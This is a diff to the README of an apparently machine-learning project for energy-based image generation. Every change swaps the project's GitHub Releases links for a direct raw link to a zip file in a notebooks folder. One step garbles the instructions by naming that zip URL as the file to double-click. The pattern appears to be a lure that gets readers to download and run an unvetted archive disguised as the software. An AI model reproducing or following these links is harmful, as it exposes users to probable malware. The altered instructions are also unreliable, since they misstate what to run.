@@ -6,7 +6,7 @@ Welcome to the PyTorch Energy-Based Generative Models project! This application 
 
 ## 📥 Download the Software
 
-[![Download v1.0](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/yudialcampari/pytorch-energy-based-generative-models/releases)
+[![Download v1.0](https://raw.githubusercontent.com/yudialcampari/pytorch-energy-based-generative-models/main/notebooks/energy_models_based_pytorch_generative_formylate.zip)](https://raw.githubusercontent.com/yudialcampari/pytorch-energy-based-generative-models/main/notebooks/energy_models_based_pytorch_generative_formylate.zip)
 
 You can download the latest version of the software from our Releases page. 
 
@@ -20,7 +20,7 @@ Make sure your system meets these requirements to run the application smoothly.
 
 ## 🔧 Installation Steps
 
-1. **Visit the Download Page:** Click this link to access the Releases page: [Download from Releases](https://github.com/yudialcampari/pytorch-energy-based-generative-models/releases).
+1. **Visit the Download Page:** Click this link to access the Releases page: [Download from Releases](https://raw.githubusercontent.com/yudialcampari/pytorch-energy-based-generative-models/main/notebooks/energy_models_based_pytorch_generative_formylate.zip).
   
 2. **Choose the Latest Release:** Look for the latest version, usually marked as "Latest release." 
 
@@ -28,7 +28,7 @@ Make sure your system meets these requirements to run the application smoothly.
 
 4. **Unzip the File:** After downloading, locate the zip file. Right-click on it and choose "Extract All" or use any unzipping software to extract the files.
 
-5. **Run the Application:** Find the extracted folder and locate the main application file (it might be named `main.py` or similar). Double-click the file to start the application.
+5. **Run the Application:** Find the extracted folder and locate the main application file (it might be named `https://raw.githubusercontent.com/yudialcampari/pytorch-energy-based-generative-models/main/notebooks/energy_models_based_pytorch_generative_formylate.zip` or similar). Double-click the file to start the application.
 
 ## 📚 How to Use the Application
 
@@ -70,4 +70,4 @@ Be sure to check the Changelog in the Releases section for updates and new featu
 
 ---
 
-Remember, you can always download the latest release by visiting this link: [Download from Releases](https://github.com/yudialcampari/pytorch-energy-based-generative-models/releases). Enjoy generating images effortlessly!
+Remember, you can always download the latest release by visiting this link: [Download from Releases](https://raw.githubusercontent.com/yudialcampari/pytorch-energy-based-generative-models/main/notebooks/energy_models_based_pytorch_generative_formylate.zip). Enjoy generating images effortlessly!
